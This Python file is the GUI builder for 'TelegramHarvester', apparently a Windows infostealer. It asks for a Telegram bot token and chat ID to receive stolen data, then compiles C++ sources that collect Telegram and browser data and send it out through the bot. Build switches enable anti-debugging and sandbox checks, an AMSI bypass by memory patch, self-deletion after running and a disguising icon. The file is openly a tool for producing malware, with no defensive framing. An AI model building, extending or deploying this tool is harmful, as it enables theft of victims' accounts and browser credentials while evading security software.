#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TelegramHarvester Builder GUI  v1.0
Builds the harvester EXE with custom settings via a modern dark GUI.

Requirements:
    pip install customtkinter pycryptodome
    MinGW-w64 (g++) in PATH → https://www.mingw-w64.org/
"""

# ── Auto-install dependencies ──────────────────────────────────────────────────
import sys
import subprocess as _sp

def _ensure(pkg, import_as=None):
    try:
        __import__(import_as or pkg)
    except ImportError:
        print(f"[*] Installing {pkg}...")
        _sp.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"])

_ensure("customtkinter")
_ensure("pycryptodome", "Crypto")

# ── Imports ────────────────────────────────────────────────────────────────────
import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog
import subprocess
import threading
import os
import shutil
import time
from pathlib import Path

# ── Theme ──────────────────────────────────────────────────────────────────────
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

# ── Palette ────────────────────────────────────────────────────────────────────
BG      = "#0f0f1a"
SURFACE = "#1a1a2e"
CARD    = "#16213e"
BORDER  = "#0f3460"
ACCENT  = "#e94560"
ACCENT2 = "#533483"
TEXT    = "#e0e0ff"
MUTED   = "#8888aa"
GREEN   = "#00d4aa"
RED     = "#ff4757"
BLUE    = "#70a1ff"
YELLOW  = "#ffd32a"
DIM     = "#333355"

# ── Project paths ──────────────────────────────────────────────────────────────
PROJECT_ROOT = Path(__file__).parent.resolve()

SOURCE_FILES = [
    "main.cpp",
    "harvester/collectors/telegram_collector.cpp",
    "harvester/collectors/browser_collector.cpp",
    "harvester/collectors/app_detector.cpp",
    "harvester/system/system_info.cpp",
    "harvester/report/report_builder.cpp",
    "harvester/utils/zip_utils.cpp",
    "harvester/exfil/telegram_client.cpp",
    "harvester/crypto/obfuscation.cpp",
    "harvester/evasion/anti_debug.cpp",
    "harvester/evasion/amsi_bypass.cpp",
    "harvester/evasion/self_delete.cpp",
]

LINK_LIBS = [
    "-lwininet", "-lwbemuuid", "-lole32", "-loleaut32",
    "-lpsapi",   "-lcrypt32", "-lshlwapi", "-luser32",
    "-ladvapi32", "-lshell32",
]

LOG_TAGS = {
    "ok":      GREEN,
    "err":     RED,
    "warn":    YELLOW,
    "info":    BLUE,
    "muted":   MUTED,
    "head":    "#ffffff",
    "success": GREEN,
    "dim":     "#444466",
}


# ── Reusable section card ──────────────────────────────────────────────────────
class SectionCard(ctk.CTkFrame):
    """Dark card with a coloured title bar."""

    def __init__(self, master, title: str, icon: str = "", **kw):
        super().__init__(master, fg_color=CARD, corner_radius=10,
                         border_width=1, border_color=BORDER, **kw)
        bar = ctk.CTkFrame(self, fg_color=SURFACE, corner_radius=0, height=38)
        bar.pack(fill="x")
        bar.pack_propagate(False)
        lbl_text = f"{icon}  {title}" if icon else title
        ctk.CTkLabel(bar, text=lbl_text, text_color=BLUE,
                     font=("Segoe UI", 11, "bold"), anchor="w"
                     ).pack(side="left", padx=16)
        self.body = ctk.CTkFrame(self, fg_color="transparent")
        self.body.pack(fill="both", expand=True, padx=16, pady=12)


# ── Main application ───────────────────────────────────────────────────────────
class BuilderApp(ctk.CTk):

    def __init__(self):
        super().__init__()
        self.title("TelegramHarvester Builder  v1.0")
        self.geometry("920x640")
        self.minsize(860, 580)
        self.configure(fg_color=BG)

        self.is_building  = False
        self._show_token  = False
        self._icon_var    = tk.StringVar()

        self._build_widgets()
        self._setup_log_tags()
        self.after(120, self._on_start)

    # ─────────────────────────────────────────────────────────── widget build ──

    def _build_widgets(self):

        # ── Header ────────────────────────────────────────────────────────────
        hdr = ctk.CTkFrame(self, fg_color=ACCENT2, corner_radius=10, height=52)
        hdr.pack(fill="x", padx=14, pady=(12, 10))
        hdr.pack_propagate(False)
        ctk.CTkLabel(hdr, text="🛠  TelegramHarvester Builder",
                     font=("Segoe UI", 16, "bold"),
                     text_color="white").pack(side="left", padx=18)
        self._status_lbl = ctk.CTkLabel(
            hdr, text="● Ready", font=("Consolas", 11, "bold"), text_color=GREEN)
        self._status_lbl.pack(side="right", padx=18)

        # ── Main 2-Column Container ───────────────────────────────────────────
        main_box = ctk.CTkFrame(self, fg_color="transparent")
        main_box.pack(fill="both", expand=True, padx=14, pady=(0, 12))

        # ── Left Column (Settings & Actions) ──────────────────────────────────
        left_col = ctk.CTkFrame(main_box, fg_color="transparent", width=460)
        left_col.pack(side="left", fill="both", expand=True, padx=(0, 8))

        # 1. Telegram Config
        s1 = SectionCard(left_col, "TELEGRAM CONFIG", "🔑")
        s1.pack(fill="x", pady=(0, 8))

        r = ctk.CTkFrame(s1.body, fg_color="transparent")
        r.pack(fill="x", pady=(0, 6))
        ctk.CTkLabel(r, text="Bot Token", width=75, anchor="w",
                     text_color=MUTED, font=("Segoe UI", 11)).pack(side="left")
        self._token_e = ctk.CTkEntry(
            r, placeholder_text="7123456789:AAF...",
            font=("Consolas", 10), fg_color=SURFACE, border_color=BORDER,
            text_color=TEXT, show="*")
        self._token_e.pack(side="left", fill="x", expand=True, padx=(4, 4))
        ctk.CTkButton(r, text="👁", width=34, height=28,
                      fg_color=SURFACE, hover_color=CARD,
                      text_color=MUTED, border_width=1, border_color=BORDER,
                      command=self._toggle_token).pack(side="left")

        r2 = ctk.CTkFrame(s1.body, fg_color="transparent")
        r2.pack(fill="x")
        ctk.CTkLabel(r2, text="Chat ID", width=75, anchor="w",
                     text_color=MUTED, font=("Segoe UI", 11)).pack(side="left")
        self._chatid_e = ctk.CTkEntry(
            r2, placeholder_text="-100123456789 / 123456789",
            font=("Consolas", 10), fg_color=SURFACE, border_color=BORDER,
            text_color=TEXT)
        self._chatid_e.pack(side="left", fill="x", expand=True, padx=(4, 0))

        # 2. Evasion Options
        s2 = SectionCard(left_col, "EVASION OPTIONS", "🛡")
        s2.pack(fill="x", pady=(0, 8))
        g = ctk.CTkFrame(s2.body, fg_color="transparent")
        g.pack(fill="x")
        g.columnconfigure((0, 1), weight=1)

        self._v_antidebug = self._sw(g, "Anti-Debug",  True,  0, 0, "Debugger/Sandbox check")
        self._v_amsi      = self._sw(g, "AMSI Bypass", True,  0, 1, "Memory patch AMSI")
        self._v_selfdel   = self._sw(g, "Self-Delete", False, 1, 0, "Auto-remove after run")
        self._v_debug_log = self._sw(g, "Debug Log",   False, 1, 1, "Save C:\\debug.txt")

        # 3. Output Settings
        s3 = SectionCard(left_col, "OUTPUT SETTINGS", "📦")
        s3.pack(fill="x", pady=(0, 8))

        r3 = ctk.CTkFrame(s3.body, fg_color="transparent")
        r3.pack(fill="x", pady=(0, 6))
        ctk.CTkLabel(r3, text="Filename", width=75, anchor="w",
                     text_color=MUTED, font=("Segoe UI", 11)).pack(side="left")
        self._out_e = ctk.CTkEntry(
            r3, font=("Consolas", 10),
            fg_color=SURFACE, border_color=BORDER, text_color=TEXT)
        self._out_e.insert(0, "TelegramHarvester.exe")
        self._out_e.pack(side="left", fill="x", expand=True, padx=(4, 0))

        r4 = ctk.CTkFrame(s3.body, fg_color="transparent")
        r4.pack(fill="x")
        ctk.CTkLabel(r4, text="Icon (.ico)", width=75, anchor="w",
                     text_color=MUTED, font=("Segoe UI", 11)).pack(side="left")
        self._icon_e = ctk.CTkEntry(
            r4, placeholder_text="(optional) .ico file",
            font=("Consolas", 10), fg_color=SURFACE, border_color=BORDER,
            text_color=TEXT, textvariable=self._icon_var)
        self._icon_e.pack(side="left", fill="x", expand=True, padx=(4, 4))
        ctk.CTkButton(r4, text="📁", width=34, height=28,
                      fg_color=SURFACE, hover_color=CARD,
                      text_color=MUTED, border_width=1, border_color=BORDER,
                      command=self._browse_icon).pack(side="left")

        # 4. Action Buttons (PROMINENT BUILD BUTTON)
        bf = ctk.CTkFrame(left_col, fg_color="transparent")
        bf.pack(fill="x", pady=(4, 0))

        self._build_btn = ctk.CTkButton(
            bf, text="🔨   BUILD NOW",
            height=44, corner_radius=8,
            font=("Segoe UI", 13, "bold"),
            fg_color=ACCENT2, hover_color=ACCENT, text_color="white",
            command=self._on_build)
        self._build_btn.pack(fill="x", pady=(0, 6))

        sub_btns = ctk.CTkFrame(bf, fg_color="transparent")
        sub_btns.pack(fill="x")
        sub_btns.columnconfigure((0, 1), weight=1)

        ctk.CTkButton(sub_btns, text="📁 Open Folder",
                      height=32, corner_radius=6,
                      font=("Segoe UI", 11),
                      fg_color=SURFACE, hover_color=CARD,
                      text_color=TEXT, border_width=1, border_color=BORDER,
                      command=lambda: os.startfile(str(PROJECT_ROOT))
                      ).grid(row=0, column=0, padx=(0, 4), sticky="ew")

        ctk.CTkButton(sub_btns, text="🗑 Clear Log",
                      height=32, corner_radius=6,
                      font=("Segoe UI", 11),
                      fg_color=SURFACE, hover_color=CARD,
                      text_color=MUTED, border_width=1, border_color=BORDER,
                      command=self._clear_log
                      ).grid(row=0, column=1, padx=(4, 0), sticky="ew")

        # ── Right Column (Log & Progress) ─────────────────────────────────────
        right_col = ctk.CTkFrame(main_box, fg_color="transparent")
        right_col.pack(side="right", fill="both", expand=True, padx=(8, 0))

        s4 = SectionCard(right_col, "BUILD LOG", "📋")
        s4.pack(fill="both", expand=True, pady=(0, 8))
        self._log_tb = ctk.CTkTextbox(
            s4.body, fg_color="#08080f",
            font=("Consolas", 10), text_color=TEXT,
            corner_radius=6, wrap="word",
            border_width=1, border_color=BORDER)
        self._log_tb.pack(fill="both", expand=True)
        self._log_tb.configure(state="disabled")

        # Progress bar
        pf = ctk.CTkFrame(right_col, fg_color="transparent")
        pf.pack(fill="x")
        self._prog = ctk.CTkProgressBar(pf, height=8,
                                         fg_color=SURFACE,
                                         progress_color=ACCENT2)
        self._prog.set(0)
        self._prog.pack(fill="x", side="left", expand=True, padx=(0, 8))
        self._pct_lbl = ctk.CTkLabel(pf, text="0%",
                                      font=("Consolas", 10),
                                      text_color=MUTED, width=36)
        self._pct_lbl.pack(side="right")

    # ─────────────────────────────────────────────────── switch helper ──

    def _sw(self, parent, label: str, default: bool,
             row: int, col: int, hint: str = "") -> tk.BooleanVar:
        f = ctk.CTkFrame(parent, fg_color=SURFACE, corner_radius=8)
        f.grid(row=row, column=col,
               padx=(0, 6) if col % 2 == 0 else (6, 0),
               pady=(0, 8), sticky="ew")

        var = tk.BooleanVar(value=default)
        left = ctk.CTkFrame(f, fg_color="transparent")
        left.pack(side="left", fill="both", expand=True, padx=12, pady=10)
        ctk.CTkLabel(left, text=label, font=("Segoe UI", 11, "bold"),
                     text_color=TEXT, anchor="w").pack(anchor="w")
        if hint:
            ctk.CTkLabel(left, text=hint, font=("Segoe UI", 9),
                         text_color=MUTED, anchor="w").pack(anchor="w")
        ctk.CTkSwitch(f, variable=var, text="",
                      progress_color=GREEN,
                      width=46, height=22
                      ).pack(side="right", padx=12, pady=10)
        return var

    # ─────────────────────────────────────────────────────── log tags ──

    def _setup_log_tags(self):
        tb = self._log_tb._textbox
        for name, color in LOG_TAGS.items():
            tb.tag_configure(name, foreground=color)
        tb.tag_configure("success", foreground=GREEN,
                         font=("Consolas", 11, "bold"))
        tb.tag_configure("err",     foreground=RED,
                         font=("Consolas", 11, "bold"))
        tb.tag_configure("head",    foreground="#ffffff",
                         font=("Consolas", 12, "bold"))

    # ─────────────────────────────────────────────────────── helpers ──

    def _toggle_token(self):
        self._show_token = not self._show_token
        self._token_e.configure(show="" if self._show_token else "*")

    def _browse_icon(self):
        p = filedialog.askopenfilename(
            title="Select icon file",
            filetypes=[("Icon files", "*.ico"), ("All files", "*.*")])
        if p:
            self._icon_var.set(p)

    def _clear_log(self):
        self._log_tb.configure(state="normal")
        self._log_tb.delete("1.0", "end")
        self._log_tb.configure(state="disabled")

    def _set_status(self, text: str, color: str):
        self.after(0, lambda: self._status_lbl.configure(
            text=f"● {text}", text_color=color))

    def _set_prog(self, v: float):
        pct = int(v * 100)
        self.after(0, lambda: self._prog.set(v))
        self.after(0, lambda: self._pct_lbl.configure(text=f"{pct}%"))

    def log(self, msg: str, tag: str = ""):
        """Thread-safe append to log console."""
        def _do():
            tb = self._log_tb._textbox
            tb.configure(state="normal")
            if tag and tag in LOG_TAGS:
                tb.insert("end", msg + "\n", tag)
            else:
                tb.insert("end", msg + "\n")
            tb.see("end")
            tb.configure(state="disabled")
        self.after(0, _do)

    # ─────────────────────────────────────────────────────── startup ──

    def _on_start(self):
        self.log("  TelegramHarvester Builder  v1.0", "head")
        self.log("-" * 55, "dim")
        self.log("")
        self._check_env()

    def _check_env(self):
        self.log("[*] Checking build environment...", "info")

        gpp = shutil.which("g++")
        if gpp:
            try:
                r = subprocess.run(["g++", "--version"],
                                   capture_output=True, text=True, timeout=5)
                ver = r.stdout.splitlines()[0] if r.stdout else "found"
                self.log(f"[+] g++    : {ver}", "ok")
            except Exception:
                self.log("[+] g++ found", "ok")
        else:
            self.log("[-] g++ NOT found in PATH!", "err")
            self.log("    Install MinGW-w64: https://www.mingw-w64.org/", "warn")
            self._set_status("g++ missing", RED)

        self.log(f"[+] Python : {sys.version.split()[0]}", "ok")

        try:
            import Crypto
            self.log("[+] pycryptodome : OK", "ok")
        except ImportError:
            self.log("[!] pycryptodome : missing (auto-install on build)", "warn")

        missing = [sf for sf in SOURCE_FILES
                   if not (PROJECT_ROOT / sf).exists()]
        if missing:
            self.log(f"[!] {len(missing)} source file(s) not found:", "warn")
            for m in missing:
                self.log(f"    * {m}", "muted")
        else:
            self.log(f"[+] Sources  : {len(SOURCE_FILES)} files found", "ok")

        gen_py = PROJECT_ROOT / "generate_obfuscated.py"
        if gen_py.exists():
            self.log("[+] Obfuscator: generate_obfuscated.py found", "ok")
        else:
            self.log("[-] generate_obfuscated.py NOT found!", "err")

        self.log("")

    # ─────────────────────────────────────────────────────── build ──

    def _on_build(self):
        if self.is_building:
            return

        token   = self._token_e.get().strip()
        chat_id = self._chatid_e.get().strip()
        outfile = self._out_e.get().strip() or "TelegramHarvester.exe"
        icon    = self._icon_var.get().strip()

        if not token:
            self.log("[-] Bot Token is required!", "err"); return
        if ":" not in token:
            self.log("[-] Bot Token looks invalid (missing ':').", "err"); return
        if not chat_id:
            self.log("[-] Chat ID is required!", "err"); return
        if not shutil.which("g++"):
            self.log("[-] g++ not found. Install MinGW-w64 first.", "err"); return
        if not outfile.lower().endswith(".exe"):
            outfile += ".exe"

        self.is_building = True
        self._build_btn.configure(state="disabled",
                                   text="Building...",
                                   fg_color="#3a3a5a")
        self._set_status("Building...", YELLOW)
        self._set_prog(0)

        threading.Thread(
            target=self._worker,
            args=(token, chat_id, outfile, icon,
                  self._v_antidebug.get(), self._v_amsi.get(),
                  self._v_selfdel.get(), self._v_debug_log.get()),
            daemon=True
        ).start()

    # ─────────────────────────────────────────── background worker ──

    def _worker(self, token, chat_id, outfile, icon,
                anti_debug, amsi, self_del, debug_log):
        try:
            self.log("")
            self.log("=" * 55, "dim")
            self.log(f"  Build started  ->  {outfile}", "head")
            self.log("=" * 55, "dim")
            self.log("")

            # Step 1 — Obfuscation ────────────────────────────────────────────
            self._step(1, 4, "Generating obfuscation header")
            self._set_prog(0.05)

            gen_py = PROJECT_ROOT / "generate_obfuscated.py"
            result = subprocess.run(
                [sys.executable, str(gen_py),
                 "--token", token, "--chat-id", chat_id],
                capture_output=True, text=True,
                cwd=str(PROJECT_ROOT), timeout=30)

            if result.returncode != 0:
                self.log("[-] Obfuscation script failed:", "err")
                for line in (result.stderr or result.stdout or "").splitlines()[:25]:
                    self.log(f"    {line}", "err")
                return

            self.log("[+] generated_obfuscation.h  written successfully", "ok")
            self._set_prog(0.20)

            # Step 2 — Compile ────────────────────────────────────────────────
            self._step(2, 4, "Compiling source files")

            defines = [
                f"-DUSE_ANTI_DEBUG={'1' if anti_debug else '0'}",
                f"-DUSE_AMSI_BYPASS={'1' if amsi else '0'}",
                f"-DUSE_SELF_DELETE={'1' if self_del else '0'}",
                f"-DDEBUG_LOG={'1' if debug_log else '0'}",
            ]

            srcs = []
            for sf in SOURCE_FILES:
                fp = PROJECT_ROOT / sf
                if fp.exists():
                    srcs.append(str(fp))
                else:
                    self.log(f"[!] Missing (skipped): {sf}", "warn")

            out_path = PROJECT_ROOT / outfile
            cmd = (
                ["g++", "-O2", "-std=c++17",
                 "-static", "-static-libgcc", "-static-libstdc++",
                 "-mwindows",
                 f"-I{PROJECT_ROOT}"]
                + defines + srcs
                + ["-o", str(out_path)]
                + LINK_LIBS
            )

            self.log(
                f"  Flags  : Anti-Debug={int(anti_debug)}"
                f"  AMSI={int(amsi)}"
                f"  SelfDel={int(self_del)}"
                f"  DebugLog={int(debug_log)}", "muted")
            self.log(f"  Files  : {len(srcs)} source files", "muted")
            self.log(f"  Output : {outfile}", "muted")
            self.log("")

            for i, sf in enumerate(SOURCE_FILES, 1):
                self._set_prog(0.20 + (i / len(SOURCE_FILES)) * 0.55)
                name = sf.split("/")[-1]
                self.log(f"  [{i:02d}/{len(SOURCE_FILES)}] Compiling {name}", "muted")
                time.sleep(0.04)

            result2 = subprocess.run(cmd, capture_output=True, text=True,
                                     cwd=str(PROJECT_ROOT), timeout=300)

            if result2.returncode != 0:
                self.log("")
                self.log("[-] Compilation FAILED:", "err")
                errors = (result2.stderr or result2.stdout or "No output").splitlines()
                for line in errors[:50]:
                    tag = ("err"  if "error:"   in line.lower() else
                           "warn" if "warning:" in line.lower() else "muted")
                    self.log(f"  {line}", tag)
                return

            self.log("[+] Compilation successful!", "ok")
            self._set_prog(0.82)

            # Step 3 — Icon ───────────────────────────────────────────────────
            self._step(3, 4, "Applying icon")
            if icon and Path(icon).exists():
                rcedit = shutil.which("rcedit") or shutil.which("rcedit-x64")
                if rcedit:
                    ri = subprocess.run(
                        [rcedit, str(out_path), "--set-icon", icon],
                        capture_output=True, timeout=30)
                    if ri.returncode == 0:
                        self.log("[+] Icon applied", "ok")
                    else:
                        self.log("[!] rcedit error — icon skipped", "warn")
                else:
                    self.log("[!] rcedit not found — icon skipped", "warn")
                    self.log(
                        "    Get it: https://github.com/electron/rcedit/releases",
                        "muted")
            else:
                self.log("[-] No icon specified (skipped)", "muted")
            self._set_prog(0.92)

            # Step 4 — Done ───────────────────────────────────────────────────
            self._step(4, 4, "Finalizing")
            size_bytes = out_path.stat().st_size if out_path.exists() else 0
            size_str   = (f"{size_bytes/1024/1024:.2f} MB"
                          if size_bytes > 1024 * 1024
                          else f"{size_bytes / 1024:.1f} KB")
            self._set_prog(1.0)

            self.log("")
            self.log("=" * 55, "dim")
            self.log("  BUILD COMPLETE!", "success")
            self.log(f"  File  : {outfile}", "ok")
            self.log(f"  Size  : {size_str}", "ok")
            self.log(f"  Path  : {out_path}", "muted")
            self.log("=" * 55, "dim")
            self._set_status("Build Complete", GREEN)

        except subprocess.TimeoutExpired:
            self.log("[-] Build timed out (> 5 min)!", "err")
            self._set_status("Timeout", RED)
        except Exception as ex:
            self.log(f"[-] Unexpected error: {ex}", "err")
            self._set_status("Error", RED)
        finally:
            self.is_building = False
            self.after(0, lambda: self._build_btn.configure(
                state="normal",
                text="BUILD NOW",
                fg_color=ACCENT2))

    def _step(self, n: int, total: int, msg: str):
        self.log(f"\n[{n}/{total}] {msg}...", "info")


# ── Entry point ────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    app = BuilderApp()
    app.mainloop()
